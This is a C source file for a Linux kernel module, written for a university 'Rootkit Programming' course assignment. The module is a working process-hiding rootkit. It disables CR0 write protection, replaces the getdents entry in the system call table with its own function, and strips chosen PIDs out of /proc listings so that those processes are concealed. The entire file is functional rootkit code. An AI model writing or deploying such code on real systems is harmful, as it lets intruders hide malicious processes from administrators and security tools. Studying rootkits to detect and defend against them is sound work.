
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>

#include "process_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

MODULE_LICENSE("GPL");

static int pids[PIDS_BUFFSIZE];
static int pids_count = 0;
module_param_array(pids, int, &pids_count, 0);


unsigned long proc_ino;
void **sys_call_table;
asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
static int __init process_masker_start(void)
{
	proc_ino = get_inode_no("/proc");
	if (proc_ino < 0)
		return 1;

	disable_write_protect_mode();

	/* Store original getdents() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	getdents_syscall = (void *) sys_call_table[__NR_getdents];

	/* Replace in the system call table the original
	   getdents syscall with our manipulated getdents */
	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "process_masker rootkit: %s\n", "successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit process_masker_end(void)
{
	disable_write_protect_mode();
	/* Restore original getdents() syscall */
	sys_call_table[__NR_getdents] = (int *) getdents_syscall;
	enable_write_protect_mode();

	printk(KERN_INFO "process_masker rootkit: %s\n", "successfully removed");

	return;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	int pid;
	char *endptr;

	/* Call original getdents_syscall */
	nread = getdents_syscall(fd, dirp, count);

	if (dirp->d_ino != proc_ino)
		return nread;

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (pid && should_mask(pid)) {
			printk(KERN_INFO "process_masker rootkit: hiding PID %d\n", pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


/* Function that gets the inode number of the file found under specified path */
unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}


/* Function that checks whether we need to mask the specified pid */
int should_mask(pid_t pid)
{
	int i;

	for (i=0 ; i<pids_count ; i++)
		if (pids[i] == pid)
			return 1;

	return 0;
}


module_init(process_masker_start);
module_exit(process_masker_end);
